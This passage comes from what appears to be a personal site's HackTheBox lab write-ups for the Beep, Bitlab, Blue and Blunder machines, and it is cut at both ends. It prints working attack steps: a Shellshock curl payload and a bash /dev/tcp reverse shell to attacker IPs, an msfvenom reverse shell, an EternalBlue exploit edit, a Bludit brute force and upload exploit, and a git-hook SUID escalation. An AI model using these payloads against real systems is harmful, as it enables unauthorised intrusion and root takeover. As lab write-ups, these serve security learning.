VERSION\n22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)\n| ssh-hostkey: \n|_  1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)\n25/tcp    open  smtp       Postfix smtpd\n|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n80/tcp    open  http       Apache httpd 2.2.3\n|_http-server-header: Apache/2.2.3 (CentOS)\n|_http-title: Did not follow redirect to https://10.10.10.7/\n110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_pop3-capabilities: STLS USER AUTH-RESP-CODE LOGIN-DELAY(0) RESP-CODES UIDL EXPIRE(NEVER) TOP IMPLEMENTATION(Cyrus POP3 server v2) APOP PIPELINING\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n111/tcp   open  rpcbind    2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            876/udp   status\n|_  100024  1            879/tcp   status\n143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_imap-capabilities: ACL CHILDREN OK ATOMIC STARTTLS Completed NO URLAUTHA0001 BINARY RENAME LIST-SUBSCRIBED QUOTA IMAP4rev1 SORT=MODSEQ LISTEXT UNSELECT CATENATE LITERAL+ IDLE CONDSTORE IMAP4 ID ANNOTATEMORE THREAD=REFERENCES THREAD=ORDEREDSUBJECT SORT MAILBOX-REFERRALS MULTIAPPEND RIGHTS=kxte NAMESPACE X-NETSCAPE UIDPLUS\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))\n| http-robots.txt: 1 disallowed entry \n|_/\n|_http-server-header: Apache/2.2.3 (CentOS)\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2017-04-07T08:22:08\n|_Not valid after:  2018-04-07T08:22:08\n|_ssl-date: 2021-12-29T17:16:46+00:00; +1h00m02s from scanner time.\n|_http-title: Elastix - Login page\n879/tcp   open  status     1 (RPC #100024)\n993/tcp   open  ssl/imap   Cyrus imapd\n|_imap-capabilities: CAPABILITY\n995/tcp   open  pop3       Cyrus pop3d\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_ssl-known-key: ERROR: Script execution failed (use -d to debug)\n3306/tcp  open  mysql      MySQL (unauthorized)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)\n4445/tcp  open  upnotifyp?\n4559/tcp  open  hylafax    HylaFAX 4.3.10\n5038/tcp  open  asterisk   Asterisk Call Manager 1.1\n10000/tcp open  http       MiniServ 1.570 (Webmin httpd)\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\nService Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix\n\nHost script results:\n|_clock-skew: 1h00m01s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 307.86 seconds\n</code></pre></p> <p>A lot of ports open, I like to start with the web applications so let's go ahead.</p>"},{"location":"HackTheBox/Beep/#port-80-and-443","title":"Port 80 and 443","text":"<p>The port 80 just redirect to 443 so they are the same. The certificate shows that <code>localhost.localdomain</code> is the domain name, for now I will not change my <code>hosts</code> file.</p> <p>We are welcomed by the Elasticx login page, I tried some default credentials but no luck so I launched <code>gobuster</code>: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u https://10.10.10.7/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     https://10.10.10.7/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2021/12/29 11:40:30 Starting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 310] [--&gt; https://10.10.10.7/images/]\n/help                 (Status: 301) [Size: 308] [--&gt; https://10.10.10.7/help/]  \n/themes               (Status: 301) [Size: 310] [--&gt; https://10.10.10.7/themes/]\n/modules              (Status: 301) [Size: 311] [--&gt; https://10.10.10.7/modules/]\n/mail                 (Status: 301) [Size: 308] [--&gt; https://10.10.10.7/mail/]   \n/admin                (Status: 301) [Size: 309] [--&gt; https://10.10.10.7/admin/]  \n/static               (Status: 301) [Size: 310] [--&gt; https://10.10.10.7/static/] \n/lang                 (Status: 301) [Size: 308] [--&gt; https://10.10.10.7/lang/]   \n/var                  (Status: 301) [Size: 307] [--&gt; https://10.10.10.7/var/]    \n/panel                (Status: 301) [Size: 309] [--&gt; https://10.10.10.7/panel/]  \n/libs                 (Status: 301) [Size: 308] [--&gt; https://10.10.10.7/libs/]   \n/recordings           (Status: 301) [Size: 314] [--&gt; https://10.10.10.7/recordings/]\n/configs              (Status: 301) [Size: 311] [--&gt; https://10.10.10.7/configs/]   \n/vtigercrm            (Status: 301) [Size: 313] [--&gt; https://10.10.10.7/vtigercrm/] \n\n===============================================================\n2021/12/29 12:41:23 Finished\n===============================================================\n</code></pre></p> <p>We can access the FreePBX admin panel in the <code>/admin</code> directory, again no luck with the credentials but we have version information: <code>FreePBX 2.8.1.4</code>.</p> <p>In <code>/vtigercrm</code> we find another login page we cannot pass, sad.</p> <p>I found some exploits that could work but I want to check the web service in the port 10000 first.</p>"},{"location":"HackTheBox/Beep/#port-10000","title":"Port 10000","text":"<p>This shows a Webmin login page, again no luck with the default credentials but looking to the URL we can see <code>/session_login.cgi</code>. </p>"},{"location":"HackTheBox/Beep/#shellshock","title":"Shellshock","text":"<p>Let's test a simple Shellshock payload to get a reverse shell, maybe we are lucky: <pre><code>curl 'https://10.10.10.7:10000/session_login.cgi' -k -H 'User-Agent: () { :; }; /bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.29/8080 0&gt;&amp;1\"' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://10.10.10.7:10000' -H 'Connection: keep-alive' -H 'Referer: https://10.10.10.7:10000/session_login.cgi' -H 'Cookie: testing=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'page=%2F&amp;user=root&amp;pass=root' &gt; /dev/null\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.10.14.29] from (UNKNOWN) [10.10.10.7] 52435\nbash: no job control in this shell\n[root@beep webmin]#\n</code></pre> Wow! That worked and we are root already! We can get the user flag under: <code>/home/fanis/user.txt</code> and the root flag under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Bitlab/","title":"Bitlab","text":""},{"location":"HackTheBox/Bitlab/#nmap","title":"Nmap","text":"<p>As always a port scan to see where we start:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.114    \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 15:59 CET\nNmap scan report for 10.10.10.114\nHost is up (0.039s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 115.16 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22,80 -sC -sV 10.10.10.114\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 16:03 CET\nNmap scan report for 10.10.10.114\nHost is up (0.039s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a23bb0dd2891bfe8f9308231232f9218 (RSA)\n|   256 e63bfbb37f9a35a8bdd0277b25d4eddc (ECDSA)\n|_  256 c9543d91017803ab16146bccf0b73a55 (ED25519)\n80/tcp open  http    nginx\n|_http-trane-info: Problem with XML parsing of /evox/about\n| http-title: Sign in \\xC2\\xB7 GitLab\n|_Requested resource was http://10.10.10.114/users/sign_in\n| http-robots.txt: 55 disallowed entries (15 shown)\n| / /autocomplete/users /search /api /admin /profile \n| /dashboard /projects/new /groups/new /groups/*/edit /users /help \n|_/s/ /snippets/new /snippets/*/edit\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.07 seconds\n</code></pre>"},{"location":"HackTheBox/Bitlab/#port-80","title":"Port 80","text":""},{"location":"HackTheBox/Bitlab/#our-way-in","title":"Our way in","text":"<p>This is a GitLab installation. By bruteforcing directories I found two registered users: <code>root</code> and <code>clave</code>. The rest of the directories were not interesting... until I clicked the help section.</p> <p>In the <code>/help</code> directory, I found a directory listing with bookmarks. One of them was actually executing obfuscated javascript. After working on it for a bit, this is the code but readable:</p> <pre><code>        (function() {\n    var values = [\"value\", \"user_login\", \"getElementById\", \"clave\", \"user_password\", \"11des0081x\"];\n    document[values[2]](values[1])[values[0]] = values[3];\n    document[values[2]](values[4])[values[0]] = values[5];\n})()\n\" ADD_DATE=\"\n1554932142\n</code></pre> <p>Basically, this is trying to fill the login details for the user <code>clave</code>. We have credentials to login into GitLAB now! <code>clave:11des0081x</code>.</p>"},{"location":"HackTheBox/Bitlab/#logged-in-as-clave","title":"Logged in as clave","text":"<p>Now we can explore the non public repositories. I found this snipped with what could be credentials for an internal database, I will let this here just in case.</p> <pre><code>&lt;?php\n$db_connection = pg_connect(\"host=localhost dbname=profiles user=profiles password=profiles\");\n$result = pg_query($db_connection, \"SELECT * FROM profiles\");\n</code></pre> <p>Then, remember when I said the directory brute force did not really discover important things? Well now I found that these pages are my way in:</p> <pre><code>http://10.10.10.114/profile\nhttp://10.10.10.114/deployer/\n</code></pre> <p>Both applications have its repository in the GitLab page.The Deployer thing basically allows me to deploy new merged changes to the master branch of the Profile repository. Since we are allowed to push changes to the Profile <code>test-deploy</code> branch, I uploaded a webshell to the branch and I merged this changes into the master branch.</p> <p>My new \"feature\" was deployed without me actually using the Deployer application so... thanks to the administrator I guess. We can now get a reverse shell into the machine by accesing the webshell I uploaded in <code>http://10.10.10.114/profile/test.php</code> and executing:</p> <pre><code>bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.25/8000 0&gt;&amp;1\"\n</code></pre> <p>Remember that you need to prepare a listener in your machine!</p>"},{"location":"HackTheBox/Bitlab/#pwned","title":"Pwned!","text":"<p>Inmediately I executed this:</p> <pre><code>www-data@bitlab:/var/www$ sudo -l\nMatching Defaults entries for www-data on bitlab:\n    env_reset, exempt_group=sudo, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on bitlab:\n    (root) NOPASSWD: /usr/bin/git pull\n</code></pre> <p>As I expected, we can execute the <code>git pull</code> command as <code>root</code> (The Deployer application code is using <code>sudo</code>). </p> <p>There is something called hooks in Git that allows us to basically execute a task when something happens. We can execute as <code>root</code> the pull action, so the code inside a <code>post-merge</code> hook will run as <code>root</code>:</p> <pre><code>#! /bin/bash\n\nchmod u+s /bin/bash\n</code></pre> <p>Of course we cannot do this in the original directory because it is owned by <code>root</code>, so we have to copy the repository to, for example, <code>/tmp</code> and create the hook there. The hook will covert the <code>/bin/bash</code> binary into a SUID binary we can use to escalate. In order for the hook to execute however, we need new changes in the upstream but that is not a problem since we can repeat what we did with the webshell but modifying the <code>README.md</code> file or whatever.</p> <p>Once everything is ready, pull the changes into our malicious repository and the box is pwned!</p> <pre><code>www-data@bitlab:/tmp/profile$ sudo /usr/bin/git pull\nremote: Enumerating objects: 6, done.\nremote: Counting objects: 100% (6/6), done.\nremote: Compressing objects: 100% (4/4), done.\nremote: Total 4 (delta 2), reused 1 (delta 0)\nUnpacking objects: 100% (4/4), done.\nFrom ssh://localhost:3022/root/profile\n   c569005..6870424  master      -&gt; origin/master\n   4f20db1..5ccecd4  test-deploy -&gt; origin/test-deploy\nUpdating c569005..6870424\nFast-forward\n README.md | 3 +--\n 1 file changed, 1 insertion(+), 2 deletions(-)\nwww-data@bitlab:/tmp/profile$ ls -l /bin/bash\n-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash\nwww-data@bitlab:/tmp/profile$ bash -p\nbash-4.4# id\nuid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)\n</code></pre> <p>We could have also used this method but with a master and a slave repository so everything is self contained. Check this repository for an example: https://github.com/arnav-t/git-pull-priv-escalation.</p>"},{"location":"HackTheBox/Blue/","title":"Blue","text":""},{"location":"HackTheBox/Blue/#nmap","title":"Nmap","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 &lt;MACHINE_IP&gt; \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:54 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.048s latency).\nNot shown: 65526 closed ports\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 35.47 seconds\n           Raw packets sent: 65843 (2.897MB) | Rcvd: 65673 (2.627MB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Blue]\n\u2514\u2500$ sudo nmap -sC -sV -p135,139,445,49152,49153,49154,49155,49156,49157 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 16:06 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.048s latency).\n\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49156/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  msrpc        Microsoft Windows RPC\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -19m51s, deviation: 34m36s, median: 6s\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-09-26T21:07:40+01:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-26T20:07:39\n|_  start_date: 2021-09-26T18:54:31\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 71.74 seconds\n</code></pre> <p>The most interesting thing is SMB. Let's dig a bit.</p>"},{"location":"HackTheBox/Blue/#eternal-blue","title":"Eternal Blue?","text":"<p>Since the SMB service is running in a Windows 7 machine I wanted to check if could be vulnerable to Eternal Blue:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Blue]\n\u2514\u2500$ sudo nmap --script smb-vuln* -p445 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 17:22 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.048s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n\nNmap done: 1 IP address (1 host up) scanned in 13.00 seconds\n</code></pre> <p>It is cool! Now we can go for the easy path using the Metasploit exploit: <code>windows/smb/ms17_010_eternalblue</code> or try to own the machine searching for the exploit ourselves, I guess you know my preference.</p>"},{"location":"HackTheBox/Blue/#getting-access","title":"Getting access","text":"<p>First, we need an exploit for this so using <code>searchsploit</code> we can get what we need:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Blue/exploit]\n\u2514\u2500$ searchsploit ms17-010                                                                   \n--------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                       |  Path\n--------------------------------------------------------------------------------------------------------------------- ---------------------------------\nMicrosoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17 | windows/remote/43970.rb\nMicrosoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                        | windows/dos/41891.rb\nMicrosoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                     | windows/remote/42031.py\nMicrosoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                 | windows/remote/42315.py\nMicrosoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                           | windows_x86-64/remote/42030.py\nMicrosoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                        | windows_x86-64/remote/41987.py\n--------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre> <p>I would go with the <code>windows/remote/42315.py</code> one so executing: <code>searchsploit -m windows/remote/42315.py</code> we will copy the exploit to our current directory. Now it is time to configure the exploit:</p> <ol> <li>Get <code>mysmb.py</code> from the exploit link.</li> <li>In the line 36 configure the username as <code>guest</code> (Using <code>smbclient</code> you can check that anonymous login is allowed for the $IPC share).</li> <li>Generate a Windows reverse shell: <code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ATACKER_IP&gt; LPORT=8080 -f exe &gt; revshell.exe</code></li> <li>Go the line 913 and replace the <code>smb_pwn</code> function with this: <pre><code>def smb_pwn(conn, arch):\n    smbConn = conn.get_smbconnection()\n\n    print('exec revshell')\n\n    smb_send_file(smbConn, './revshell.exe', 'C', '/revshell.exe')\n    service_exec(conn, r'cmd /c , c:\\revshell.exe')\n</code></pre></li> <li>Spin up a listener in the 8080 port (Or whaterver port you configure the reverse shell with)</li> <li>Run the exploit with <code>python 42315.py &lt;MACHINE_IP&gt;</code> to get a shell!</li> </ol> <p>Since Eternal Blue give access as <code>system</code> we have finished and can get the flags:</p> <pre><code>C:\\Users\\haris\\Desktop\\user.txt\nC:\\Users\\Administrator\\Desktop\\root.txt\n</code></pre>"},{"location":"HackTheBox/Blunder/","title":"Blunder","text":""},{"location":"HackTheBox/Blunder/#nmap","title":"Nmap","text":"<p>Like always time for a Nmap scan.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.191\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 16:57 CET\nNmap scan report for 10.10.10.191\nHost is up (0.052s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT   STATE  SERVICE\n21/tcp closed ftp\n80/tcp open   http\n\nNmap done: 1 IP address (1 host up) scanned in 103.37 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p 80 -sC -sV 10.10.10.191\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 17:00 CET\nNmap scan report for 10.10.10.191\nHost is up (0.049s latency).\n\nPORT   STATE  SERVICE VERSION\n80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Blunder | A blunder of interesting facts\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Blunder\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.30 seconds\n</code></pre>"},{"location":"HackTheBox/Blunder/#port-80","title":"Port 80","text":"<p>Let's see what a directory bruteforce can say about the page.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ feroxbuster -u http://10.10.10.191/ -w Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php ,txt -B\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.7.2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://10.10.10.191/\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.7.2\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udcb2  Extensions            \u2502 [php, , txt]\n \ud83c\udfe6  Collect Backups       \u2502 true\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n \ud83c\udf89  New Version Available \u2502 https://github.com/epi052/feroxbuster/releases/latest\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n301      GET        0l        0w        0c http://10.10.10.191/admin =&gt; http://10.10.10.191/admin/\n200      GET      170l      918w     7562c http://10.10.10.191/\n403      GET        9l       28w      277c http://10.10.10.191/.php\n200      GET        1l        5w       30c http://10.10.10.191/install.php\n200      GET      105l      303w     3281c http://10.10.10.191/about\n401      GET        0l        0w        0c http://10.10.10.191/admin/ajax\n200      GET      170l      918w     7562c http://10.10.10.191/0\n200      GET        2l        4w       22c http://10.10.10.191/robots.txt\n200      GET        4l       23w      118c http://10.10.10.191/todo.txt\n403      GET        9l       28w      277c http://10.10.10.191/server-status\n200      GET       21l      171w     1083c http://10.10.10.191/LICENSE\n200      GET      110l      387w     3960c http://10.10.10.191/usb\n[####################] - 29m   240069/240069  0s      found:12      errors:160\n</code></pre> <p>According with the files and the administration login, this is a Bludit CMS. That <code>todo.txt</code> thing looks interesting:</p> <pre><code>-Update the CMS\n-Turn off FTP - DONE\n-Remove old users - DONE\n-Inform fergus that the new blog needs images - PENDING\n</code></pre> <p>Hmm, I will note the name <code>fergus</code> since it is maybe a valid user. The CMS version looks like it is 3.9.2 according with some of the CSS files, searching for vulnerabilities I found some canditates.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ searchsploit BLUDIT      \n----------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                     |  Path\n----------------------------------------------------------------------------------- ---------------------------------\nBludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                        | php/webapps/48746.rb\nBludit - Directory Traversal Image File Upload (Metasploit)                        | php/remote/47699.rb\nBludit 3.13.1 - 'username' Cross Site Scripting (XSS)                              | php/webapps/50529.txt\nBludit 3.9.12 - Directory Traversal                                                | php/webapps/48568.py\nBludit 3.9.2 - Auth Bruteforce Bypass                                              | php/webapps/48942.py\nBludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                       | php/webapps/49037.rb\nBludit 3.9.2 - Directory Traversal                                                 | multiple/webapps/48701.txt\nbludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt\n----------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>The interesting one here is the bruteforce bypass, using Cewl I got a custom wordlist of the page and using <code>fergus</code> as the username I started the attack:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Blunder]\n\u2514\u2500$ python3 CVE-2019-17240.py -l http://10.10.10.191/admin/ -u users.txt -p passwords.txt \n[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX \n\n[\u25d1] Brute Force: Testing -&gt; fergus:CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)\n[ ] Brute Force: Testing -&gt; fergus:the\n...\n[\u2193] Brute Force: Testing -&gt; fergus:Contribution\n[*] Brute Force: Testing -&gt; fergus:Letters\n[\u259d] Brute Force: Testing -&gt; fergus:probably\n[v] Brute Force: Testing -&gt; fergus:best\n[\u250c] Brute Force: Testing -&gt; fergus:fictional\n[\\] Brute Force: Testing -&gt; fergus:character\n[o] Brute Force: Testing -&gt; fergus:RolandDeschain\n\n[*] SUCCESS !!\n[+] Use Credential -&gt; fergus:RolandDeschain\n</code></pre> <p>Cool! Now we can abuse CVE-2019-16113 to get shell into the system.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Blunder]\n\u2514\u2500$ ./CVE-2019-16113.py \n[+] Loggin successful.\n[+] Token CSRF: 99113db248585aa181ff61762743a627f9d1fa34\n[+] Shell upload succesful.\n[+] .htaccess upload succesful.\n[+] Command Execution Successful.\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8000                           \nlistening on [any] 8000 ...\nconnect to [10.10.14.25] from (UNKNOWN) [10.10.10.191] 43076\nbash: cannot set terminal process group (1285): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$\n</code></pre>"},{"location":"HackTheBox/Blunder/#in-the-box","title":"In the box","text":""},{"location":"HackTheBox/Blunder/#from-www-data-to-hugo","title":"From <code>www-data</code> to <code>hugo</code>","text":"<p>The first part of the escalation was easy, in the 